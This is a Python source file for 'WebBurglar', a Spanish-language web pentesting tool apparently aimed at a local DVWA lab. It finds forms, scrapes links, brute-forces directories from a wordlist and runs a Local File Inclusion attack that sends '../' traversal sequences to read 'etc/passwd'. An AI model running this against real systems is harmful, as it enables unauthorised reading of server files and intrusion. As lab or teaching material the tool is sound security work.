#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from sukolib import *
import argparse
from urllib.parse import urljoin
import urlsuko

parser = argparse.ArgumentParser(description='Comando para realizar ataques de fuerza bruta en paginas web')  

parser.add_argument ("-u","--url", help="url de destino",default="http://127.0.0.1/DVWA/login.php")
parser.add_argument ("-p","--payload", help="Payload enviado para realizar un ataque",default="etc/passwd")
parser.add_argument ("-F","--field", help="Nombre del campo sobre el que se inyecta el payload",default="page")
parser.add_argument ("-c","--command", help="Comando a ejecutar (getforms: Obtiene los forms presentes en una URL, dirlsiting: Ejecuta 'directory listing a partir de una URL, webscraping: lista todos los enlaces a presentes en una URL una URL, LFI: ejecuta un ataque de local File inclussion",default="getforms")
parser.add_argument ("-C","--cookies", help="Permite añadir una cookie de una sesion iniciada",default="{}")
parser.add_argument ("-D","--depth", help="Profundidad de la busqueda cuando se realiza webScrapping",default="2")
parser.add_argument ("-d","--dictionary", help="Fichero utilizado como diccionario",default="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
parser.add_argument ("-L","--list", action='store_true',help="Lista los comandos soportados")
parser.add_argument ("-f","--fmt", help="formato de salida",default="console")
parser.add_argument ("-q","--quiet", action='store_true', help='Desactiva los mensajes')
parser.add_argument("-v","--verbose", action='store_true', help='Activa el modo debug')
parser.add_argument("-e","--external", action='store_true', help='Haciendo WebScrapping incluye enlaces a URLs de otros dominios (sin profundizar en ellos)')


args=parser.parse_args() 

# URL de la página con el formulario
url = args.url

def print_form(form):
    print (messg(f"URL: {form['url']}",'+','green'))
    print (messg(f"Method: {form['method']}",'+','green'))
    print (messg(f"Action: {form['action']}",'+','green'))
    for field in form['input'].keys():
        print (messg(f"field: {field} :: {form['input'][field]}",'++','blue'))

def get_forms(url,cookies):
 forms=[]
 print (messg(f"Buscando forms para {url}",'+','green'))
 u=urlsuko.urlsuko(url)
 u.set_cookies(cookies)
 status,response = u.getURL()
 if not status:
     return forms
 soup = BeautifulSoup(response.text, 'html.parser')
 formularios = soup.find_all('form')
 for i, form in enumerate(formularios, start=1):
    form_={}
    form_['url'] = url
    form_['method'] = form.get('method', 'GET').upper()
    form_['action'] = form.get('action', 'Ninguna')
    form_['input']={}
    # Buscar inputs
    inputs = form.find_all(['input', 'select', 'textarea'])

    for inp in inputs:
        nombre = inp.get('name')
        tipo = inp.get('type', 'text' if inp.name == 'input' else inp.name)
        form_['input'][nombre]=tipo
    forms.append(form_)
 return forms

#def get_forms(url):
# forms=[]
# print (messg(f"Buscando forms para {url}",'+','green'))
# # Obtener el HTML de la página
# try:
#  response = requests.get(url)
# except:
#  print (messg(f"Error accediendo a {url}",'-','red'))
#  return forms
# soup = BeautifulSoup(response.text, 'html.parser')
# formularios = soup.find_all('form')
# for i, form in enumerate(formularios, start=1):
#    form_={}
#    form_['url'] = url
#    form_['method'] = form.get('method', 'GET').upper()
#    form_['action'] = form.get('action', 'Ninguna')
#    form_['input']={}
#    # Buscar inputs
#    inputs = form.find_all(['input', 'select', 'textarea'])
#    for inp in inputs:
#        nombre = inp.get('name')
#        tipo = inp.get('type', 'text' if inp.name == 'input' else inp.name)
#    forms.append(form_)
# return forms
        
#def dirlisting(parms):
#    print (f"Ejecuntando directory listing en  {parms['URL']}")
#    with (open (parms['DICT'],'r')) as f:
#               dir_list=[line.strip() for line in f.readlines()]
#    resultados={}
#    for directory in dir_list:
#        target= parms['URL']+"/"+directory
#        try:
#          response = requests.get(target).status_code
#          if (response==200): 
#              print (messg(f"{target}",f"{response}",'green'))
#              for r in response.history:
#                   print(f"{r.status_code} → {r.url}")
#          elif (response>=300) and (response<400):
#              print (messg(f"{target} ==> {response.url}",f"{response}",'yellow'))
#          else:
#              if not args.verbose:
#                print (messg(f"{target}",f"{response}",'red'))
#        except:
#              if not args.verbose:
#                 print (messg(f"{target}","ERROR",'red'))

def filelisting(target,parent):
 u=urlsuko.urlsuko(target)
 status,response = u.getURL(allow_redirects=False)
 if status and response.status_code in (301,302,307,308):
    redireccion=response.headers.get('Location')
    if not (parent==target):
       print (messg(f"{target} --> {redireccion}",f"{response.status_code}",'blue'))
    listado=u.getFiles()
    for direct in listado:
        if direct[0]=='/':
            continue;
        newurl=f"{redireccion}{direct}"
        u.setURL(newurl)
        status,response=u.getURL(allow_redirects=False) 
        if status and response.status_code==200:
           pass 
           #print (messg(f"{newurl}",f"{response.status_code}",'green'))
        elif status and response.status_code in (300,301,302,303,307,308):
           redireccion=response.headers.get('Location')
           print (messg(f"{newurl} --> {redireccion}",f"{response.status_code}",'orange'))
        elif status:
           print (messg(f"{newurl}",f"{response.status_code}",'red'))
        if (not ('?' in newurl)):   
           filelisting(newurl,target)
 elif (status and response.status_code==200): 
    if not (parent==target):
       print (messg(f"{target}",f"{response.status_code}",'green'))
    else:
        return 0
    listado=u.getFiles()
    for direct in listado:
        if direct[0]=='/':
            continue;
        newurl=f"{target}{direct}"
        u.setURL(newurl)
        status,response=u.getURL(allow_redirects=False) 
        if status and response.status_code==200:
           pass
           #print (messg(f"{newurl}",f"{response.status_code}",'green'))
        elif status and response.status_code in (300,301,302,303,307,308):
           redireccion=response.headers.get('Location')
           print (messg(f"{newurl} --> {redireccion}",f"{response.status_code}",'orange'))
        elif status:
           print (messg(f"{newurl}",f"{response.status_code}",'red'))
        if (not ('?' in newurl)):   
           filelisting(newurl,target)
 elif status and response.status_code in (500,501,502,503): 
      print (messg(f"{target}",f"{response.status_code}",'red'))
 else:
      if args.verbose:
         print (messg(f"{target}",f"{response}",'red'))


def dirlisting(parms):
    with (open (parms['DICT'],'r')) as f:
               dir_list=[line.strip() for line in f.readlines()]
    resultados=[]
    for directory in dir_list:
        if len(directory)==0 or directory[0]=='#':
            continue
        target= parms['URL']+"/"+directory
        filelisting(target,parms['URL'])
    return resultados

def getforms(parms):
    lista_urls={parms['URL']}
    if parms['depth']>1:
       parms['depth']-=1
       lista_urls=lista_urls|webscraping(parms)
    for enlace in lista_urls:   
     print (messg(f"{enlace}",'+','green'))
     for formulario in get_forms(enlace,parms['COOKIE']):
      print (messg("Formulario encontrado",'','red'))
      if args.fmt=='json':
        print(formulario)
      else:
        print_form (formulario)
     

def webscraping(parms):
    revisadas=set()
    return scraping(parms['URL'],parms,revisadas,parms['depth'])

    
def scraping(enlace,parms,revisadas,depth):
    if depth < 1:
        return revisadas
    u=urlsuko.urlsuko(enlace)
    u.set_cookies(parms['COOKIE'])
    for link in u.getLinks():
        link=link.split('#')[0]
        if not (link in revisadas) and u.same_domain(link):
            if parms['verbose']:
               print(messg(f"Buscando enlaces a partir de {link}",str(depth),'cyan'))
            revisadas.add(link)
            revisadas=revisadas|scraping(link,parms,revisadas,depth-1)
        elif parms['include_external']:
            revisadas.add(link)
    return revisadas

def lfi (parms):
    back=parms['depth']*"../"
    enlace=f"{parms['URL']}?{parms['field']}={back}{parms['payload']}"
    u=urlsuko.urlsuko(enlace)
    u.set_cookies(parms['COOKIE'])
    status,response=u.getURL()
    if status and response.status_code==200:
        print (messg(f"{enlace}",str(response.status_code),'blue'))
        print (response.text)
    elif status:
        print (messg(f"{enlace} no encotrado",str(response.status_code),'red'))



def main():
    comandos={'lfi':{'funcion':lfi,'desc':"Realiza ataques Local File Inclussion"},'getforms':{'funcion':getforms,'desc':"busqueda de formularios"},'dirlisting':{'funcion':dirlisting,'desc':"directory listing"},'webscraping':{'funcion':webscraping,'desc':"webscraping"}}
    if not args.quiet:
      titulo ("\t| WebBurglar |","Web analyzer Pentesting Tool, V 0.1","Author: Felix Castan Cid",'red','black')
    if args.list:
     print (messg(f"Los protocolos soportados son: {list(comandos.keys())}","+",'green'))
     return 0
    parms={'URL':args.url,'DICT':args.dictionary,'COOKIE':args.cookies,'payload':args.payload,'field':args.field,'include_external':args.external,'verbose':args.verbose}
    try:
       parms['depth']=int(args.depth)
    except:
       parms['depth']=2

    if args.command in comandos.keys():
        if not args.quiet:
            print(messg(f"Ejecutando {comandos[args.command]['desc']} en {parms['URL']}",'','blue')) 
        resultados=comandos[args.command]['funcion'](parms)
    else:
        print (messg(f"Comando {args.command} no soportado",'-','red'))

    if args.command=='webscraping':
        for enlace in resultados:
            print (messg(f"{enlace}",'+','green'))
main()
